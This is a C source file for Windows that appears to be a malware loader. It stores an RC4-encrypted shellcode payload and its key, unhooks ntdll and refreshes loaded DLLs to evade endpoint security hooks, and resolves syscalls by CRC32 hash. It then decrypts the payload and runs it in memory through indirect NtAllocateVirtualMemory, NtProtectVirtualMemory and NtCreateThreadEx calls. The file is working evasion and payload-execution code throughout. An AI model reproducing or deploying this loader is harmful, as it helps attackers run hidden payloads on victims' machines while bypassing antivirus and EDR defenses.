#include <Windows.h>
#include "Common.h"
#include "Debug.h"

UCHAR ProtectedKey[] = { 0x17, 0x27, 0x16, 0xDF, 0x03, 0x7D, 0xF4, 0x73, 0xF8, 0xB6, 0x43, 0x19, 0xB8, 0x60, 0x04, 0x6F };

UCHAR Payload[] = {
		0x38, 0xDC, 0xFD, 0x08, 0x2B, 0xDF, 0x0C, 0xD4, 0x1D, 0x0E, 0x56, 0xA2, 0x03, 0x63, 0x1F, 0xC3,
		0x29, 0xEA, 0xF3, 0xA4, 0xE5, 0x21, 0x50, 0x6C, 0x52, 0x67, 0x05, 0x3E, 0xCE, 0x8D, 0x7B, 0xD0,
		0x8A, 0xE3, 0xB6, 0xA4, 0x07, 0x0B, 0xF0, 0x5F, 0x13, 0xA8, 0xD3, 0x43, 0x13, 0x11, 0xD6, 0xDF,
		0xF6, 0x25, 0xDD, 0x5A, 0x10, 0xCE, 0x74, 0x4A, 0x89, 0x53, 0xC4, 0xD5, 0x0C, 0x52, 0x5F, 0xAD,
		0xAA, 0xC5, 0x34, 0xD5, 0x3A, 0x51, 0x4A, 0xCC, 0xE1, 0x9F, 0x38, 0x4E, 0xB7, 0xE2, 0xFC, 0xD6,
		0x41, 0x85, 0x79, 0x6A, 0x7A, 0x0B, 0x98, 0xE3, 0x89, 0x43, 0x47, 0x50, 0xC2, 0xDE, 0xEF, 0xB5,
		0xA0, 0xC0, 0x7C, 0x1C, 0x90, 0x9B, 0xA2, 0x88, 0xB4, 0x87, 0x12, 0xAA, 0x98, 0x6B, 0xC9, 0xE0,
		0x73, 0xCC, 0x52, 0xB0, 0x7D, 0xCF, 0xFC, 0x77, 0x50, 0x1A, 0xF3, 0x40, 0xBD, 0x04, 0x0A, 0x6C,
		0x5C, 0xAE, 0x7E, 0xB3, 0x7F, 0xBE, 0x80, 0xC5, 0x80, 0xBD, 0x0D, 0x42, 0xA3, 0x64, 0x6F, 0x11,
		0xE1, 0xDE, 0x27, 0x13, 0x8E, 0x58, 0x4E, 0x6A, 0x3C, 0x8E, 0x6B, 0x96, 0x31, 0xC3, 0x6F, 0xA3,
		0x69, 0x4E, 0x2F, 0x90, 0x5B, 0xB9, 0x85, 0xD3, 0xFA, 0x9C, 0x16, 0x8F, 0x0D, 0xA8, 0xF0, 0x58,
		0x89, 0xD2, 0xF5, 0x14, 0x84, 0x9E, 0x25, 0xB8, 0x56, 0xD9, 0x64, 0xCB, 0x68, 0x38, 0xD4, 0x97,
		0xC4, 0x83, 0x0F, 0x4F, 0xC3, 0xE4, 0xFF, 0x72, 0xD1, 0xFE, 0x40, 0x04, 0x5B, 0x5C, 0xAC, 0xE4,
		0xE0, 0xB8, 0x2F, 0x1B, 0x36, 0x46, 0x29, 0xA2, 0xC5, 0x21, 0xF8, 0x26, 0xC5, 0x75, 0x6E, 0xE8,
		0xE0, 0xE8, 0x5B, 0x2F, 0x56, 0x09, 0xB8, 0xCA, 0xFE, 0xC6, 0xAC, 0x6D, 0xC6, 0x8F, 0x41, 0x15,
		0x74, 0x1C, 0x3D, 0x0E, 0x4C, 0x15, 0x1B, 0xB3, 0x4B, 0xA2, 0x92, 0xC7, 0xA6, 0xBA, 0xF9, 0xAC,
		0xBC, 0x2C, 0x71, 0x99, 0x1D, 0x8E, 0x21, 0xF2, 0xB7, 0xD4, 0x06, 0x9E, 0x5E, 0xBF, 0x85, 0xF1 
};

// global variable
NTAPI_FUNC g_Nt = { 0 };

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &g_Nt.NtAllocateVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_Nt.NtProtectVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_Nt.NtCreateThreadEx)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_Nt.NtWaitForSingleObject)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);
#endif
	return TRUE;
}

INT main() {

	NTSTATUS	STATUS = NULL;
	PVOID		pAddress = NULL;
	SIZE_T		sSize = sizeof(Payload);
	DWORD		dwOld = NULL;
	HANDLE		hProcess = NtCurrentProcess(),	// local process
		hThread = NULL;

	// 'win32u.dll' contains the ROPs to jump to later 
	LoadLibraryH("win32u");

	if (!IniUnhookIndirectSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Unhooking Indirect-Syscalls\n");
#endif
		return -1;
	}

	if (!IniUnhookDirectCalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Unhooking Direct-Syscalls\n");
#endif // DEBUG
		return -1;
	}

	if (!InitializeNtSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
#endif
		return -1;
	}

	if (!RefreshAllDlls()) {
#ifdef DEBUG
		PRINTA("[!] RefreshAllDlls Failed\n");
#endif // DEBUG
		return -1;
	}

	Rc4EncryptionViSystemFunc032(ProtectedKey, Payload, KEY_SIZE, sizeof(Payload));

	// allocating memory
	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
#ifdef DEBUG
		PRINTA("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	_memcpy(pAddress, Payload, sizeof(Payload));

	// changing memory protection
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ, &dwOld)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	// executing the payload
	SET_SYSCALL(g_Nt.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	// waiting for the payload
	SET_SYSCALL(g_Nt.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	return 0;
}

extern VOID* __cdecl memset(VOID*, INT, size_t);
#pragma intrinsic(memset)
#pragma function(memset)
VOID* __cdecl memset(VOID* pTarget, INT value, size_t cbTarget) {
	PUCHAR p = (PUCHAR)pTarget;
	while (cbTarget-- > 0) {
		*p++ = (UCHAR)value;
	}
	return pTarget;
}